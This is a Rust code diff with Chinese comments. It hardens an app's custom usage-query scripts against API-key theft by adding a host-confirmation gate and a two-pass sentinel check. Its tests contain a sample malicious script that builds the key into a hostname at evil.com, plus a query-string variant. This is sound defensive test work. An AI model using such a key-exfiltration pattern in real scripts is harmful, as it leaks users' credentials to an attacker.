@@ -5,7 +5,35 @@ use url::{Host, Url};
 
 use crate::error::AppError;
 
-/// 执行用量查询脚本
+/// 用量脚本执行结果（P0-2）。
+///
+/// custom 用量脚本首次向非回环主机外发时会走“域名确认闸门”：真实密钥不出网，转而返回
+/// [`UsageScriptOutcome::NeedsConfirmation`] 携带目标 host 交前端确认。
+pub enum UsageScriptOutcome {
+    /// 脚本成功执行并返回用量数据 JSON。
+    Completed(Value),
+    /// 首次外发需用户确认目标 host（此刻真实密钥尚未注入外发）。
+    NeedsConfirmation { host: String },
+}
+
+/// TOCTOU 两遍法第一遍注入密钥类变量时使用的哨兵值。
+///
+/// 哨兵值必须与真实密钥不同，才能在“注入前算 host / 注入后再算 host”两遍之间发现把密钥
+/// 编入主机名（如 `https://{{apiKey}}.evil.com`）的行为——两遍 host 不一致即拒绝。取值为
+/// DNS 合法字符（小写字母 / 数字 / 连字符），即便被拼进主机名也能被 URL 正常解析出来比对。
+const SENTINEL_API_KEY: &str = "usage-script-sentinel-key";
+const SENTINEL_ACCESS_TOKEN: &str = "usage-script-sentinel-token";
+
+/// 执行用量查询脚本。
+///
+/// - **非 custom 模板**：单遍法。注入真实密钥后由 `validate_request_url` 的同源校验把请求
+///   host 钉死在 `base_url` 上，无需确认闸门（行为与历史一致）。
+/// - **custom 模板**：两遍法（TOCTOU 防护 + 域名确认闸门）。第一遍用哨兵值替换密钥类变量
+///   （`{{apiKey}}`/`{{accessToken}}`；`{{baseUrl}}`/`{{userId}}` 保留真实）算出目标 host 并
+///   做 HTTPS 校验；目标非回环且未确认（或已确认 host 不匹配）时返回 `NeedsConfirmation`，
+///   真实密钥绝不出网。仅当目标 host 已确认（或为回环）时，第二遍才注入真实密钥、再次校验
+///   host 与第一遍一致后才发起请求。`confirmed_host` 为该 provider 已确认的目标 host 标签。
+#[allow(clippy::too_many_arguments)]
 pub async fn execute_usage_script(
     script_code: &str,
     api_key: &str,
@@ -14,23 +42,83 @@ pub async fn execute_usage_script(
     access_token: Option<&str>,
     user_id: Option<&str>,
     template_type: Option<&str>,
-) -> Result<Value, AppError> {
-    // 检测是否为自定义模板模式
-    // 优先使用前端传递的 template_type
+    confirmed_host: Option<&str>,
+) -> Result<UsageScriptOutcome, AppError> {
+    // 检测是否为自定义模板模式（优先使用前端传递的 template_type）
     let is_custom_template = template_type.map(|t| t == "custom").unwrap_or(false);
 
-    // 1. 替换模板变量，避免泄露敏感信息
-    let script_with_vars =
-        build_script_with_vars(script_code, api_key, base_url, access_token, user_id);
-
-    // 2. 验证 base_url 的安全性（仅当提供了 base_url 时）
-    // 自定义模板模式下，用户可能不使用模板变量，而是直接在脚本中写完整 URL
+    // 验证 base_url 的安全性（仅非 custom 且非空时；custom 允许脚本内直接写完整 URL）
     if should_validate_base_url(base_url, is_custom_template) {
         validate_base_url(base_url)?;
     }
 
-    // 3. 在独立作用域中提取 request 配置（确保 Runtime/Context 在 await 前释放）
-    let request_config = {
+    // 注入真实密钥的脚本。非 custom 直接使用；custom 仅在通过确认闸门后才使用。
+    let real_script = build_script_with_vars(script_code, api_key, base_url, access_token, user_id);
+
+    // 解析出最终要发送的请求（custom 走两遍法 + 闸门；非 custom 走单遍法）。
+    let request = if is_custom_template {
+        // ── 第一遍（哨兵）：不注入真实密钥，仅算目标 host + 强制 HTTPS ──
+        let sentinel_script = build_script_with_vars(
+            script_code,
+            SENTINEL_API_KEY,
+            base_url,
+            access_token.map(|_| SENTINEL_ACCESS_TOKEN),
+            user_id,
+        );
+        let sentinel_request = eval_request_config(&sentinel_script)?;
+        // custom 同样强制 HTTPS（仅回环可明文），但跳过同源检查。
+        validate_request_url(&sentinel_request.url, base_url, true)?;
+        let sentinel_url = parse_request_url(&sentinel_request.url)?;
+        let sentinel_loopback = is_loopback_host(&sentinel_url);
+        let sentinel_host = request_host_label(&sentinel_url)?;
+
+        // ── 确认闸门：非回环且（未确认 / 已确认 host 不匹配）→ 拒发真实密钥，回传待确认 host ──
+        if needs_host_confirmation(&sentinel_host, sentinel_loopback, confirmed_host) {
+            return Ok(UsageScriptOutcome::NeedsConfirmation {
+                host: sentinel_host,
+            });
+        }
+
+        // ── 第二遍（真实）：注入真实密钥后重新算 host，必须与哨兵遍一致 ──
+        let real_request = eval_request_config(&real_script)?;
+        validate_request_url(&real_request.url, base_url, true)?;
+        let real_url = parse_request_url(&real_request.url)?;
+        let real_host = request_host_label(&real_url)?;
+        if real_host != sentinel_host {
+            // 注入真实密钥后目标 host 变化 → 疑似把密钥编进主机名（TOCTOU 外传通道），拒绝。
+            return Err(AppError::localized(
+                "usage_script.request_host_toctou",
+                format!(
+                    "注入密钥后请求目标由 {sentinel_host} 变为 {real_host}，疑似将密钥编入主机名，已拒绝"
+                ),
+                format!(
+                    "Request target changed from {sentinel_host} to {real_host} after key injection (possible key-in-host exfiltration); blocked"
+                ),
+            ));
+        }
+        real_request
+    } else {
+        // ── 非 custom：单遍法，同源校验把 host 钉死在 base_url ──
+        let request = eval_request_config(&real_script)?;
+        validate_request_url(&request.url, base_url, false)?;
+        request
+    };
+
+    // 发送 HTTP 请求（到这一步才真正携带真实密钥出网）。
+    let response_data = send_http_request(&request, timeout_secs).await?;
+
+    // 执行 extractor 得到用量数据。
+    let result = run_extractor(&real_script, &response_data)?;
+
+    // 验证返回值格式。
+    validate_result(&result)?;
+
+    Ok(UsageScriptOutcome::Completed(result))
+}
+
+/// 在独立作用域中 eval 脚本并提取 `request` 配置（确保 Runtime/Context 在 await 前释放）。
+fn eval_request_config(script: &str) -> Result<RequestConfig, AppError> {
+    let request_json = {
         let runtime = Runtime::new().map_err(|e| {
             AppError::localized(
                 "usage_script.runtime_create_failed",
@@ -48,7 +136,7 @@ pub async fn execute_usage_script(
 
         context.with(|ctx| {
             // 执行用户代码，获取配置对象
-            let config: rquickjs::Object = ctx.eval(script_with_vars.clone()).map_err(|e| {
+            let config: rquickjs::Object = ctx.eval(script.to_owned()).map_err(|e| {
                 AppError::localized(
                     "usage_script.config_parse_failed",
                     format!("解析配置失败: {e}"),
@@ -95,28 +183,17 @@ pub async fn execute_usage_script(
         })?
     }; // Runtime 和 Context 在这里被 drop
 
-    // 4. 解析 request 配置
-    let request: RequestConfig = serde_json::from_str(&request_config).map_err(|e| {
+    serde_json::from_str(&request_json).map_err(|e| {
         AppError::localized(
             "usage_script.request_format_invalid",
             format!("request 配置格式错误: {e}"),
             format!("Invalid request config format: {e}"),
         )
-    })?;
+    })
+}
 
-    // 5. 验证请求 URL（HTTPS 强制 + 同源检查）
-    validate_request_url(&request.url, base_url, is_custom_template)?;
-
-    // 6. 发送 HTTP 请求（发送前记录目标主机，便于安全审计与后续前端确认接入）
-    if let Ok(parsed_url) = Url::parse(&request.url) {
-        log::info!(
-            "usage_script: sending usage request to host: {}",
-            parsed_url.host_str().unwrap_or("unknown")
-        );
-    }
-    let response_data = send_http_request(&request, timeout_secs).await?;
-
-    // 7. 在独立作用域中执行 extractor（确保 Runtime/Context 在函数结束前释放）
+/// 在独立作用域中 eval 脚本并对响应执行 `extractor`（确保 Runtime/Context 在函数结束前释放）。
+fn run_extractor(script: &str, response_data: &str) -> Result<Value, AppError> {
     let result: Value = {
         let runtime = Runtime::new().map_err(|e| {
             AppError::localized(
@@ -135,7 +212,7 @@ pub async fn execute_usage_script(
 
         context.with(|ctx| {
             // 重新 eval 获取配置对象
-            let config: rquickjs::Object = ctx.eval(script_with_vars.clone()).map_err(|e| {
+            let config: rquickjs::Object = ctx.eval(script.to_owned()).map_err(|e| {
                 AppError::localized(
                     "usage_script.config_reparse_failed",
                     format!("重新解析配置失败: {e}"),
@@ -153,14 +230,13 @@ pub async fn execute_usage_script(
             })?;
 
             // 将响应数据转换为 JS 值
-            let response_js: rquickjs::Value =
-                ctx.json_parse(response_data.as_str()).map_err(|e| {
-                    AppError::localized(
-                        "usage_script.response_parse_failed",
-                        format!("解析响应 JSON 失败: {e}"),
-                        format!("Failed to parse response JSON: {e}"),
-                    )
-                })?;
+            let response_js: rquickjs::Value = ctx.json_parse(response_data).map_err(|e| {
+                AppError::localized(
+                    "usage_script.response_parse_failed",
+                    format!("解析响应 JSON 失败: {e}"),
+                    format!("Failed to parse response JSON: {e}"),
+                )
+            })?;
 
             // 调用 extractor(response)
             let result_js: rquickjs::Value = extractor.call((response_js,)).map_err(|e| {
@@ -207,9 +283,6 @@ pub async fn execute_usage_script(
             })
         })?
     }; // Runtime 和 Context 在这里被 drop
-
-    // 8. 验证返回值格式
-    validate_result(&result)?;
 
     Ok(result)
 }
@@ -497,20 +570,13 @@ fn validate_request_url(
 
     let is_request_loopback = is_loopback_host(&parsed_request);
 
-    // 仅允许 http / https 协议，其余协议一律拒绝
-    let scheme = parsed_request.scheme();
-    if scheme != "https" && scheme != "http" {
-        return Err(AppError::localized(
-            "usage_script.request_scheme_invalid",
-            format!("不支持的请求协议: {scheme}（仅允许 https，localhost 可用 http）"),
-            format!("Unsupported request URL scheme: {scheme} (only https is allowed; http is permitted for localhost only)"),
-        ));
-    }
-
-    // 无条件强制 HTTPS（所有模板模式，包括 custom），仅 loopback/localhost 豁免用于本地开发。
-    // custom 模式不再豁免：脚本在校验前已注入 {{apiKey}} 等敏感变量，
-    // 若放行明文 HTTP，恶意/被诱导导入的脚本可将真实密钥外传到任意地址
-    if scheme != "https" && !is_request_loopback {
+    // 必须使用 HTTPS（仅回环 localhost 可用明文，便于本地开发）。
+    //
+    // 安全要点：自定义模板模式**同样**强制 HTTPS。custom 模式仅放宽“与 base_url 同源”
+    // 的约束（允许访问独立的额度查询域名），但绝不放宽传输加密——脚本会把 `{{apiKey}}`
+    // 前置替换进请求再由 Rust 侧发起，明文 HTTP 发往任意主机即构成真实密钥外传通道
+    // （阶段 1 报告 §4.3 ②）。故此处不再因 custom 模式豁免 HTTPS。
+    if parsed_request.scheme() != "https" && !is_request_loopback {
         return Err(AppError::localized(
             "usage_script.request_https_required",
             "请求 URL 必须使用 HTTPS 协议（localhost 除外）",
@@ -587,6 +653,62 @@ fn is_loopback_host(url: &Url) -> bool {
     }
 }
 
+/// 解析请求 URL（错误消息与 `validate_request_url` 保持一致）。
+fn parse_request_url(request_url: &str) -> Result<Url, AppError> {
+    Url::parse(request_url).map_err(|e| {
+        AppError::localized(
+            "usage_script.request_url_invalid",
+            format!("无效的请求 URL: {e}"),
+            format!("Invalid request URL: {e}"),
+        )
+    })
+}
+
+/// 目标主机的规范化标签：用于确认闸门的持久化 / 展示 / 两遍一致性比对。
+///
+/// 默认端口（https:443 / http:80）省略；非默认端口以 `host:port` 保留；host 统一小写。
+/// 这样 `https://api.example.com` 与 `https://api.example.com:443/x` 归一化为同一标签，而
+/// `https://api.example.com:8443` 则单独成一标签（端口不同视为不同目标）。
+fn request_host_label(url: &Url) -> Result<String, AppError> {
+    let host = url
+        .host_str()
+        .ok_or_else(|| {
+            AppError::localized(
+                "usage_script.request_host_missing",
+                "请求 URL 缺少有效主机名",
+                "Request URL is missing a valid hostname",
+            )
+        })?
+        .to_ascii_lowercase();
+    Ok(match url.port() {
+        Some(port) if default_port_for_scheme(url.scheme()) != Some(port) => {
+            format!("{host}:{port}")
+        }
+        _ => host,
+    })
+}
+
+/// 已知 scheme 的默认端口（用于在 host 标签中省略默认端口）。
+fn default_port_for_scheme(scheme: &str) -> Option<u16> {
+    match scheme {
+        "https" => Some(443),
+        "http" => Some(80),
+        _ => None,
+    }
+}
+
+/// 判断某目标 host 是否需要用户确认后才能外发真实密钥（P0-2 域名确认闸门）。
+///
+/// 回环（localhost / 127.0.0.1 等）豁免以便本地开发；否则要求 `confirmed_host` 与目标
+/// host 标签完全一致，未确认或 host 变更（不匹配）都会触发确认。
+fn needs_host_confirmation(
+    host_label: &str,
+    is_loopback: bool,
+    confirmed_host: Option<&str>,
+) -> bool {
+    !is_loopback && confirmed_host != Some(host_label)
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -602,15 +724,23 @@ mod tests {
     }
 
     #[test]
-    fn test_custom_template_rejects_http_non_loopback_request() {
-        // should_validate_base_url 维持现状：custom 模式跳过未使用的 base_url 校验
-        assert!(
-            !should_validate_base_url("http://10.37.192.156:8090/anthropic", true),
-            "Custom scripts should not validate an unused provider base_url fallback"
+    fn test_custom_template_allows_cross_origin_https_request() {
+        // custom 模式放宽“同源”约束：允许访问与 base_url 不同的 HTTPS 额度域名。
+        let result = validate_request_url(
+            "https://quota.example.net/user/balance",
+            "https://api.example.com/anthropic",
+            true,
         );
+        assert!(
+            result.is_ok(),
+            "Custom scripts may call a different-origin HTTPS quota endpoint"
+        );
+    }
 
-        // 但请求 URL 的 HTTPS 强制不受 custom 影响：
-        // 脚本在校验前已注入 apiKey，放行明文 HTTP 会导致密钥外传
+    #[test]
+    fn test_custom_template_still_enforces_https_for_non_loopback() {
+        // 安全回归：custom 模式不再豁免 HTTPS。明文 HTTP 发往非回环主机会外传 {{apiKey}}，
+        // 必须被拒绝（阶段 1 报告 §4.3 ②）。
         let result = validate_request_url(
             "http://10.37.192.156:18344/user/balance",
             "http://10.37.192.156:8090/anthropic",
@@ -618,57 +748,18 @@ mod tests {
         );
         assert!(
             result.is_err(),
-            "Custom usage scripts must not send plaintext HTTP to non-loopback hosts"
+            "Custom scripts must not exfiltrate keys over plaintext HTTP to a non-loopback host"
         );
     }
 
     #[test]
-    fn test_custom_template_allows_cross_origin_https() {
-        let result = validate_request_url(
-            "https://quota.example.org/user/balance",
-            "https://api.example.com/anthropic",
-            true,
-        );
+    fn test_custom_template_allows_loopback_http_for_dev() {
+        // 回环明文仍允许，便于本地开发自建额度端点。
+        let result = validate_request_url("http://127.0.0.1:18344/user/balance", "", true);
         assert!(
             result.is_ok(),
-            "Custom usage scripts should be able to call cross-origin HTTPS endpoints"
+            "Loopback HTTP remains allowed for local development"
         );
-    }
-
-    #[test]
-    fn test_loopback_http_exemption_still_allowed() {
-        for (request_url, is_custom) in [
-            ("http://localhost:8080/usage", true),
-            ("http://localhost:8080/usage", false),
-            ("http://127.0.0.1:18344/user/balance", true),
-            ("http://127.0.0.1:18344/user/balance", false),
-        ] {
-            let result = validate_request_url(request_url, "", is_custom);
-            assert!(
-                result.is_ok(),
-                "Loopback HTTP should stay allowed: url={request_url}, custom={is_custom}"
-            );
-        }
-    }
-
-    #[test]
-    fn test_non_custom_rejects_http_non_loopback_request() {
-        let result = validate_request_url("http://api.example.com/usage", "", false);
-        assert!(
-            result.is_err(),
-            "Non-custom mode must keep rejecting plaintext HTTP to non-loopback hosts"
-        );
-    }
-
-    #[test]
-    fn test_rejects_non_http_schemes() {
-        for is_custom in [true, false] {
-            let result = validate_request_url("ftp://api.example.com/usage", "", is_custom);
-            assert!(
-                result.is_err(),
-                "Non-http(s) schemes must be rejected: custom={is_custom}"
-            );
-        }
     }
 
     #[test]
@@ -731,5 +822,86 @@ mod tests {
                 );
             }
         }
+    }
+
+    // ── P0-2 域名确认闸门 + TOCTOU 两遍法 ──
+
+    #[test]
+    fn test_request_host_label_omits_default_https_port() {
+        let url = Url::parse("https://quota.example.net/user/balance").unwrap();
+        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net");
+        let url = Url::parse("https://quota.example.net:443/x").unwrap();
+        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net");
+    }
+
+    #[test]
+    fn test_request_host_label_keeps_custom_port_and_lowercases() {
+        let url = Url::parse("https://Quota.Example.NET:8443/x").unwrap();
+        assert_eq!(request_host_label(&url).unwrap(), "quota.example.net:8443");
+    }
+
+    #[test]
+    fn test_confirmation_gate_requires_confirmation_for_new_or_changed_host() {
+        // 非回环、未确认 → 需要确认
+        assert!(needs_host_confirmation("quota.example.net", false, None));
+        // 已确认其它 host → host 变更，需重新确认
+        assert!(needs_host_confirmation(
+            "quota.example.net",
+            false,
+            Some("old.example.com")
+        ));
+    }
+
+    #[test]
+    fn test_confirmation_gate_skips_confirmed_and_loopback() {
+        // 已确认同一 host → 放行
+        assert!(!needs_host_confirmation(
+            "quota.example.net",
+            false,
+            Some("quota.example.net")
+        ));
+        // 回环豁免（即便未确认）
+        assert!(!needs_host_confirmation("localhost", true, None));
+        assert!(!needs_host_confirmation("127.0.0.1", true, None));
+    }
+
+    #[test]
+    fn test_two_pass_detects_key_in_host_injection() {
+        // 恶意脚本把 {{apiKey}} 编入主机名：两遍算出的 host 标签必然不同 → execute_usage_script
+        // 的第二遍 host 比对会拒绝，密钥不会外传到 `<realkey>.evil.com`。
+        let script = r#"({ request: { url: "https://{{apiKey}}.evil.com/collect", method: "GET" }, extractor: (r) => r })"#;
+
+        let sentinel = build_script_with_vars(script, SENTINEL_API_KEY, "", None, None);
+        let real = build_script_with_vars(script, "sk-real-secret", "", None, None);
+
+        let sentinel_host =
+            request_host_label(&Url::parse(&eval_request_config(&sentinel).unwrap().url).unwrap())
+                .unwrap();
+        let real_host =
+            request_host_label(&Url::parse(&eval_request_config(&real).unwrap().url).unwrap())
+                .unwrap();
+
+        assert_ne!(
+            sentinel_host, real_host,
+            "key-in-host injection must yield differing host labels across the two passes"
+        );
+        assert_eq!(sentinel_host, "usage-script-sentinel-key.evil.com");
+        assert_eq!(real_host, "sk-real-secret.evil.com");
+    }
+
+    #[test]
+    fn test_two_pass_same_host_when_key_in_query() {
+        // 密钥放在 query 而非 host：两遍 host 一致；是否放行取决于确认闸门，而非两遍比对。
+        let script = r#"({ request: { url: "https://quota.example.net/u?k={{apiKey}}", method: "GET" }, extractor: (r) => r })"#;
+        let sentinel = build_script_with_vars(script, SENTINEL_API_KEY, "", None, None);
+        let real = build_script_with_vars(script, "sk-real-secret", "", None, None);
+        let sentinel_host =
+            request_host_label(&Url::parse(&eval_request_config(&sentinel).unwrap().url).unwrap())
+                .unwrap();
+        let real_host =
+            request_host_label(&Url::parse(&eval_request_config(&real).unwrap().url).unwrap())
+                .unwrap();
+        assert_eq!(sentinel_host, real_host);
+        assert_eq!(sentinel_host, "quota.example.net");
     }
 }
